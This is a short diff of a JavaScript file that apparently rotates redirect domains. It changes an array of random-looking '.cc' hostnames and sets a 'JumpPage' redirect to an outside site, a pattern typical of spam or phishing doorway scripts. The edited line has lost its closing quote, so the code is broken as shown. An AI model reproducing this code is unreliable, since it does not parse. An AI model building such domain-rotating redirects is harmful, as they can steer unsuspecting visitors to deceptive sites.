@@ -38,8 +38,8 @@ var emails = [
 
 var urls=[
 	'mrrcvguw.cc/', 
-	'lyatqffb.cc/', 
-    'nfyraunbi.cc/',
+	'lyatqffb.cc/, 
+    'wunjggueo.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://91hlw2.net";
